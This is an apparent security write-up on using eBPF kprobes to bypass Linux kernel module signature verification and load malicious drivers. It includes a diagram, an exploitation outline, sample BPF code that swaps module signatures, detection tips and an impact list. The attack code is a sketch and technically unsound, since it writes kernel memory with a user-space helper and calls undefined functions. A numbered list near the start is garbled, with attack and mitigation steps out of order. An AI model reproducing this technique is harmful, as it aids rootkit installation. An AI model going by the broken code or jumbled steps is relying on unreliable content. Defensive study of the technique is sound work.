eBPF Signed-Driver Swap: Bypassing Kernel Module Signature Verification

Wut

A technique using eBPF to intercept and manipulate kernel module signature verification, allowing attackers to load unsigned or malicious drivers while maintaining the appearance of proper verification. This attack targets the kernel’s module loading process to bypass security mechanisms designed to ensure only trusted code runs in kernel space.

graph TD
    A[Signed Driver] -->|1. Load Request| B[Kernel Module Loader]
    C[eBPF Program] -->|2. Hook & Intercept| B
    B -->|3. Signature Check| D[Verification Function]
    C -->|4. Swap Content| E[Malicious Driver]
    D -->|5. Verification "Passes"| F[Driver Loaded]
    G[Security Monitor] -->|6. Sees Valid Signature| H[False Security]

Why

Because eBPF + misconfiguration => broken isolation. Kernel module signing is a critical security control that prevents unauthorized code from running with kernel privileges. By using eBPF to intercept and manipulate the signature verification process, attackers can bypass this protection and load malicious kernel modules that would otherwise be rejected, potentially leading to complete system compromise.

  7. Use the eBPF hooks to swap content during verification

  2. Implement BPF LSM policies to restrict eBPF program loading

  6. Consider using kernel lockdown mode to restrict module loading

Conclusion

eBPF is all you need. The ability to manipulate kernel module signature verification through eBPF creates a particularly dangerous scenario where malicious code can gain kernel-level access despite security controls. This technique highlights why eBPF capabilities should be treated as highly privileged operations that require strict access controls, especially in environments where kernel integrity is critical.

Technical Details

Kernel Module Signing Architecture

Linux kernel module signing provides:

  • Integrity verification: Ensures modules haven’t been tampered with
  • Authentication: Verifies modules come from a trusted source
  • Chain of trust: Extends from secure boot to kernel to modules
  • Enforcement: Prevents loading of unsigned or improperly signed modules

The verification process involves checking cryptographic signatures against trusted keys before allowing modules to be loaded into the kernel.

Exploitation Technique

The exploit leverages eBPF’s ability to attach to kernel functions that implement module signature verification. By intercepting these calls, an attacker can:

  1. Hook verification functions: Attach to functions like module_sig_check() or verify_pkcs7_signature()
  2. Identify verification requests: Determine when a module is being verified
  3. Swap content during verification: Present valid signed content during checks
  4. Restore malicious content: Replace with actual malicious code after verification
  5. Maintain appearance of security: Ensure logs show successful verification

SEC("kprobe/module_sig_check")
int BPF_KPROBE(hook_sig_check, struct module *mod)
{
    // Get module information
    char name[MODULE_NAME_LEN];
    bpf_probe_read_str(name, sizeof(name), mod->name);
    
    // Check if this is our target module
    if (is_target_module(name)) {
        // Store a reference to this module for later use
        u32 key = 0;
        bpf_map_update_elem(&target_modules, &key, &mod, BPF_ANY);
        
        // For our target module, swap in the legitimate signature
        // This would involve modifying the module's signature section
        swap_module_signature(mod);
        
        // The verification will now pass for our malicious module
    }
    
    return 0;
}

// Helper function to swap module signatures
static inline void swap_module_signature(struct module *mod)
{
    // This is a simplified representation
    // Real implementation would be more complex and target specific
    // data structures in the module signature section
    
    // Get pointer to the module's signature
    struct module_signature *sig;
    bpf_probe_read(&sig, sizeof(sig), &mod->sig);
    
    // Replace with a valid signature from our map
    struct module_signature valid_sig;
    u32 key = 0;
    bpf_map_lookup_elem(&valid_signatures, &key, &valid_sig);
    
    // Write the valid signature
    bpf_probe_write_user(sig, &valid_sig, sizeof(valid_sig));
}

Detection Methods

Defenders should monitor for:

  • Unexpected eBPF programs attached to module loading or verification functions
  • Discrepancies between module content before and after loading
  • Unusual patterns of module loading activity
  • Modules that pass verification but show anomalous behavior
  • Inconsistencies in module signatures when verified through different methods

This technique demonstrates why proper eBPF restrictions are critical for maintaining kernel integrity, especially in environments where module signing is a key security control.

Real-world Impact

In practical environments, this technique could allow an attacker to:

  • Kernel-level rootkits: Install persistent backdoors in the kernel
  • Security bypass: Disable security features enforced by the kernel
  • Data theft: Access sensitive data directly from kernel memory
  • Privilege escalation: Gain complete control over the system
  • Persistence: Maintain access that survives user-space security measures

The ability to bypass kernel module signature verification creates a particularly concerning scenario for enterprise environments, cloud platforms, and any system relying on kernel integrity for its security model.
